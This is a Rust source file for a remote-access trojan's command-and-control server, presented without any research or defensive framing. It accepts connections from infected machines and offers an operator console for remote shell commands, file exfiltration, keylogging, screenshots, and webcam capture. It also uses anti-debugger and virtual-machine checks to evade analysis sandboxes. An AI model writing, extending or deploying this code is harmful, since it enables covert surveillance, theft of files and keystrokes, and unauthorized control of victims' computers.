// C2 Server Implementation in Rust with Anti-AV Techniques

use std::collections::HashMap;
use std::sync::Arc;
use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::{mpsc, Mutex};
use serde::{Deserialize, Serialize};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use aes_gcm::aead::{Aead, KeyInit};
use rand::Rng;use std::io::Write;
use std::fs;
use toml;
use hex;

#[derive(Deserialize)]
struct Config {
    server: ServerConfig,
    security: SecurityConfig,
}

#[derive(Deserialize)]
struct ServerConfig {
    port: u16,
}

#[derive(Deserialize)]
struct SecurityConfig {
    encryption_key: String,
}

fn load_config() -> Config {
    let content = std::fs::read_to_string("config.toml").expect("Failed to read config.toml");
    toml::from_str(&content).expect("Failed to parse config")
}
fn is_vm() -> bool {
    use winreg::RegKey;
    use winreg::enums::HKEY_LOCAL_MACHINE;
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    if let Ok(key) = hklm.open_subkey("HARDWARE\\DESCRIPTION\\System") {
        if let Ok(bios) = key.get_value::<String, _>("SystemBiosVersion") {
            if bios.contains("VMware") || bios.contains("VirtualBox") || bios.contains("QEMU") {
                return true;
            }
        }
    }
    false
}

fn encrypt(data: &[u8], key: &[u8;32]) -> Vec<u8> {
    let key_slice = Key::<Aes256Gcm>::from_slice(key);
    let cipher = Aes256Gcm::new(&key_slice);
    let nonce_bytes = rand::thread_rng().gen::<[u8; 12]>();
    let nonce = Nonce::from_slice(&nonce_bytes);

    let ciphertext = cipher.encrypt(nonce, data).unwrap();
    let mut result = nonce_bytes.to_vec();
    result.extend(ciphertext);
    result
}

fn decrypt(data: &[u8], key: &[u8;32]) -> Result<Vec<u8>, String> {
    if data.len() < 12 {
        return Err("Data too short".to_string());
    }
    let key_slice = Key::<Aes256Gcm>::from_slice(key);
    let cipher = Aes256Gcm::new(&key_slice);
    let (nonce_bytes, ciphertext) = data.split_at(12);
    let nonce = Nonce::from_slice(nonce_bytes);

    cipher.decrypt(nonce, ciphertext).map_err(|_| "Decryption failed".to_string())
}

#[derive(Serialize, Deserialize, Debug, Clone)]
enum Command {
    Shell(String),
    Download(String),
    Upload { filename: String, data: Vec<u8> },
    Keylog,
    Screenshot,
    Webcam,
    WebcamStream,
    Exit,
}

#[derive(Serialize, Deserialize, Debug)]
enum Response {
    Success(String),
    Data { data: Vec<u8>, kind: String },
    Error(String),
}

struct Client {
    id: usize,
    stream: TcpStream,
}

async fn handle_client(mut client: Client, mut rx: mpsc::Receiver<Command>, encryption_key: &[u8;32]) {
    let mut buf = [0u8; 4096];
    loop {
        tokio::select! {
            Some(cmd) = rx.recv() => {
                let data = serde_json::to_vec(&cmd).unwrap();
                let encrypted = encrypt(&data, encryption_key);
                if client.stream.write_all(&encrypted).await.is_err() {
                    break;
                }
            }
            result = client.stream.read(&mut buf) => {
                match result {
                    Ok(0) => break,
                    Ok(n) => {
                        if let Ok(decrypted) = decrypt(&buf[..n], encryption_key) {
                            if let Ok(resp) = serde_json::from_slice::<Response>(&decrypted) {
                                match resp {
                                    Response::Success(msg) => println!("Client {}: {}", client.id, msg),
                                    Response::Data { data, kind } => {
                                        let ext = match kind.as_str() {
                                            "screenshot" => "png",
                                            "webcam" => "png",
                                            "download" => "bin",
                                            "webcam_video" => "mp4",
                                            _ if kind.starts_with("webcam_stream") => "png",
                                            _ => "bin",
                                        };
                                        let filename = format!("client_{}_{}.{}", client.id, kind, ext);
                                        if fs::write(&filename, &data).is_ok() {
                                            println!("Client {}: Saved {} to {}", client.id, kind, filename);
                                        } else {
                                            println!("Client {}: Failed to save {}", client.id, kind);
                                        }
                                    }
                                    Response::Error(err) => println!("Client {}: Error: {}", client.id, err),
                                }
                            }
                        }
                    }
                    Err(_) => break,
                }
            }
        }
    }
    println!("Client {} disconnected", client.id);
}

#[tokio::main]
async fn main() {
    #[cfg(windows)]
    {
        use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
        if unsafe { IsDebuggerPresent() }.as_bool() {
            std::process::exit(0);
        }
    }
    if is_vm() {
        std::process::exit(0);
    }
    let config = load_config();
    let port = config.server.port;
    let key_str = config.security.encryption_key;
    let mut encryption_key = [0u8; 32];
    hex::decode_to_slice(&key_str, &mut encryption_key).expect("Invalid key");
    println!("C2 Server listening on port {}", port);
    let listener = TcpListener::bind(format!("0.0.0.0:{}", port)).await.unwrap();
    let clients: Arc<Mutex<HashMap<usize, mpsc::Sender<Command>>>> = Arc::new(Mutex::new(HashMap::new()));
    let clients_clone = clients.clone();
    tokio::spawn(async move {
        handle_user_input(clients_clone).await;
    });
    let mut client_id = 0;
    while let Ok((stream, _)) = listener.accept().await {
        let id = client_id;
        client_id += 1;
        println!("Client {} connected", id);
        let (tx, rx) = mpsc::channel(100);
        clients.lock().await.insert(id, tx);
        let client = Client { id, stream };
        tokio::spawn(async move {
            handle_client(client, rx, &encryption_key).await;
        });
    }
}

async fn handle_user_input(clients: Arc<Mutex<HashMap<usize, mpsc::Sender<Command>>>>) {
    loop {
        print!("C2> ");
        std::io::stdout().flush().unwrap();
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).unwrap();
        let parts: Vec<&str> = input.trim().split_whitespace().collect();
        if parts.is_empty() { continue; }
        match parts[0] {
            "list" => {
                let clients_lock = clients.lock().await;
                if clients_lock.is_empty() {
                    println!("No clients connected");
                } else {
                    println!("Connected clients:");
                    for (id, _) in clients_lock.iter() {
                        println!("  Client {}", id);
                    }
                }
            }
            "shell" => {
                if parts.len() < 3 { println!("Usage: shell <client_id> <command>"); continue; }
                if let Ok(id) = parts[1].parse::<usize>() {
                    if let Some(tx) = clients.lock().await.get(&id) {
                        let cmd = parts[2..].join(" ");
                        let _ = tx.send(Command::Shell(cmd)).await;
                        println!("Sent shell command to client {}", id);
                    } else {
                        println!("Client {} not found", id);
                    }
                }
            }
            "download" => {
                if parts.len() < 3 { println!("Usage: download <client_id> <filename>"); continue; }
                if let Ok(id) = parts[1].parse::<usize>() {
                    if let Some(tx) = clients.lock().await.get(&id) {
                        let _ = tx.send(Command::Download(parts[2].to_string())).await;
                        println!("Requested download from client {}", id);
                    } else {
                        println!("Client {} not found", id);
                    }
                }
            }
            "keylog" => {
                if parts.len() < 2 { println!("Usage: keylog <client_id>"); continue; }
                if let Ok(id) = parts[1].parse::<usize>() {
                    if let Some(tx) = clients.lock().await.get(&id) {
                        let _ = tx.send(Command::Keylog).await;
                        println!("Requested keylog from client {}", id);
                    } else {
                        println!("Client {} not found", id);
                    }
                }
            }
            "screenshot" => {
                if parts.len() < 2 { println!("Usage: screenshot <client_id>"); continue; }
                if let Ok(id) = parts[1].parse::<usize>() {
                    if let Some(tx) = clients.lock().await.get(&id) {
                        let _ = tx.send(Command::Screenshot).await;
                        println!("Requested screenshot from client {}", id);
                    } else {
                        println!("Client {} not found", id);
                    }
                }
            }
            "webcam" => {
                if parts.len() < 2 { println!("Usage: webcam <client_id>"); continue; }
                if let Ok(id) = parts[1].parse::<usize>() {
                    if let Some(tx) = clients.lock().await.get(&id) {
                        let _ = tx.send(Command::Webcam).await;
                        println!("Requested webcam from client {}", id);
                    } else {
                        println!("Client {} not found", id);
                    }
                }
            }            "webcam_stream" => {
                if parts.len() < 2 { println!("Usage: webcam_stream <client_id>"); continue; }
                if let Ok(id) = parts[1].parse::<usize>() {
                    if let Some(tx) = clients.lock().await.get(&id) {
                        let _ = tx.send(Command::WebcamStream).await;
                        println!("Started webcam stream from client {}", id);
                    } else {
                        println!("Client {} not found", id);
                    }
                }
            }            "exit" => {
                if parts.len() < 2 { println!("Usage: exit <client_id>"); continue; }
                if let Ok(id) = parts[1].parse::<usize>() {
                    if let Some(tx) = clients.lock().await.get(&id) {
                        let _ = tx.send(Command::Exit).await;
                        println!("Sent exit command to client {}", id);
                    } else {
                        println!("Client {} not found", id);
                    }
                }
            }
            "help" => {
                println!("Commands:");
                println!("  list - List connected clients");
                println!("  shell <id> <cmd> - Execute shell command on client");
                println!("  download <id> <file> - Download file from client");
                println!("  keylog <id> - Get keylog from client");
                println!("  screenshot <id> - Capture screenshot from client");
                println!("  webcam <id> - Capture webcam image from client");
                println!("  webcam_stream <id> - Record webcam video for ~2 seconds (saved as client_<id>_webcam_video.mp4)");
                println!("  exit <id> - Disconnect client");
                println!("  help - Show this help");
            }
            _ => println!("Unknown command. Type 'help' for help."),
        }
    }
}